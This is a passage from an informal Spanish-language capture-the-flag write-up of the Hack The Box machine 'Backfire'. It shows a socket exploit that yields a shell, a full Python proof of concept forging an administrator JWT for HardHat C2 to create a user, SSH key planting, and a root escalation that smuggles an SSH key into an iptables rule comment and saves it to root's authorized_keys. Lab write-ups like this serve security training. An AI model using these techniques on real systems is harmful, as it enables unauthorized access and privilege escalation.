       │ i\xff\x98\x15\xce\x8c~\xefWox;\x90\xee\xa8\xff\x8c\xa81\xed\xc3m\xae\xe0\x12\x93Xk\xc
       │ 8\x02g\xda-}: \x0b\x7fR\xefqy\xfc\x9fO\x9fR\x08\xf1\xc8\xa3_\x11N\x82\xd2L =\xaeF\xc8
       │ \x9e\xdfm\xdaK\x05[\xb9\x98\x1f\xac^!\x82\xeb\x0e\xd5\x8eS^\x131\xedA\x04{\xc9\xe8\ta
       │ rL\xea!\xfb7\x05\xf4\xc9\xe3\xa3\xdfws\xd6S\xa0u\xe1(\xd0z\x87m\xbf\xbfN\xafz2\xf8U\x
       │ 0f\xb4\x83\xad\x8al\xb7\xf4\xee\x8f\x87\xf8\xa8C\x00\xb6\xf2R\xca\x86\xc0s\x90\x9c\xe
       │ eB\xf73\xc4Bh\xc3\xe96`}\xaeX\xde\xd0\xfa\xd3+`\x19 O\xce>_\x83\xa7\x0e\x0e\xfbN\'\xf
       │ 4\xc4xZ\x99\xa9\x95\x8ak\\J1\xeb=\x8e\x89h:\xc6\x93\xc1tR*kE\xf5\x10\xfaV\xc1]\xc0\xe
       │ e\xce \xd1\x8f.\xc6\xd0:a\x9c\xf66\xd9\x92\xd4\xa5\x12:t\'\xd9\xe8x\xa7\xd8\xe6\xdc5\
       │ xce\x18\xdb\x1466\x82\xecv\x90\xa5\xe5\xb1\xca\x08I\x9f\x14/\xed(\xc2}\xd8Z\xc8DHM\xa
       │ 6\x8b"kD[\x00!r'
  23   │ [***] Trying to write to the socket
  24   │ [***] Success!
  25   │ [***] Trying to poll teamserver for socket output...
  26   │ [***] Read socket output successfully!
```
y recivimos una conexion por el puerto 4444

ilya@backfire:~$ 

pero la conecion es inestable haci que pondremos nuestra  ssh key y nos conectaremos por ai



```
┌──(noesholk㉿noes)-[~]
└─$ ssh -i ~/.ssh/ssh ilya@backfire.htb
Enter passphrase for key '/home/noesholk/.ssh/ssh':
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jan 29 10:07:04 2025 from 10.10.14.127
ilya@backfire:~$
```

## procesos y puertos internos

viendo de que forma puedo combertirme en el usuario sergej me toma por sorpreza que ahy puertos internos ya sabes que topo port forwarding

ssh -i .ssh/ssh -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@backfire.htb

![](/assets/images/htb-writeup-backfire/localhost.png)

```
   1   │ import jwt
   2   │ import datetime
   3   │ import uuid
   4   │ import requests
   5   │  
   6   │ rhost = '127.0.0.1:5000'
   7   │  
   8   │ # Craft Admin JWT
   9   │ secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
  10   │ issuer = "hardhatc2.com"
  11   │ now = datetime.datetime.utcnow()
  12   │  
  13   │ expiration = now + datetime.timedelta(days=28)
  14   │ payload = {
  15   │     "sub": "HardHat_Admin",  
  16   │     "jti": str(uuid.uuid4()),
  17   │     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
  18   │     "iss": issuer,
  19   │     "aud": issuer,
  20   │     "iat": int(now.timestamp()),
  21   │     "exp": int(expiration.timestamp()),
  22   │     "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
  23   │ }
  24   │  
  25   │ token = jwt.encode(payload, secret, algorithm="HS256")
  26   │ print("Generated JWT:")
  27   │ print(token)
  28   │  
  29   │ # Use Admin JWT to create a new user 'sth_pentest' as TeamLead
  30   │ burp0_url = f"https://{rhost}/Login/Register"
  31   │ burp0_headers = {
  32   │   "Authorization": f"Bearer {token}",
  33   │   "Content-Type": "application/json"
  34   │ }
  35   │ burp0_json = {
  36   │   "password": "sth_pentest",
  37   │   "role": "TeamLead",
  38   │   "username": "sth_pentest"
  39   │ }
  40   │ r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
  41   │ print(r.text)
```


encontramos este poc que no creara un usuario



```
   1   │ python exploit4.py        
   2   │ /home/noesholk/exploit4.py:11: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal i
       │ n a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
   3   │   now = datetime.datetime.utcnow()
   4   │ Generated JWT:
   5   │ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiMDJmZGM3MjgtZGExYy00MWZkLTkyYjItODMxZjAwMj
       │ E5NjBjIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoia
       │ GFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3MzgwOTg4MjIsImV4cCI6MTc0MDUxODAyMiwiaHR0cDovL3NjaGVtYXMubWlj
       │ cm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.u6XH0rG8wWQyCYPJndZ7uXZCynvKWE4B0dgNvr
       │ Us3oo
   6   │ /usr/lib/python3/dist-packages/urllib3/connectionpool.py:1099: InsecureRequestWarning: Unverified HTTPS request is bein
       │ g made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en
       │ /latest/advanced-usage.html#tls-warnings
   7   │   warnings.warn(
   8   │ User sth_pentest created
```
- name sth_pentest
- password sth_pentest

![](/assets/images/htb-writeup-backfire/localhostssh.png)

echo "Tu key" | tee -a ~/.ssh/authorized_keys

```
ssh -i ~/.ssh/ssh sergej@backfire.htb
sergej@backfire:~$
```
## escalada de privilegios

```

   1   │ sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comm
       │ ent $'\nssh-ed25519 AAAAC3NzaC1***************************************************
       │ zvU root@noes\n'
   2   │ sergej@backfire:~$ sudo /usr/sbin/iptables -S
   3   │ -P INPUT ACCEPT
   4   │ -P FORWARD ACCEPT
   5   │ -P OUTPUT ACCEPT
   6   │ -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
   7   │ -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
   8   │ -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
   9   │ -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
  10   │ -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
  11   │ -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
  12   │ -A INPUT -i lo -m comment --comment "
  13   │ ssh-ed25519 **************************************************************** root
       │ @noes
  14   │ " -j ACCEPT
  15   │ sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

despues de aver nos conectado con  la key ssh debido a que podiamos escribir comandos en la pagina y le cambiamos la key de ssh osea la id_rsa del usuario sargej y nos conectamos bueno es maque obio pero no quiero que me digan que no explico bien xd
```
   1   │ ┌──(root㉿noes)-[~/.ssh]
   2   │ └─# ssh -i id_ed25519 root@backfire.htb 
   3   │ Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-
       │ 01-02) x86_64
   4   │ root@backfire:~# ls
   5   │ root.txt
   6   │ root@backfire:~# ls
   7   │ root.txt
   8   │ root@backfire:~# cat root.txt
   9   │ 19a170d25533610872ec3f127b8cd9e5
  10   │ root@backfire:~#
```

## explicacion

- Se agrega una regla en iptables para aceptar tráfico en localhost con un comentario inusual
- listan las reglas de iptables
- Se guarda la configuración de iptables en el archivo authorized_keys
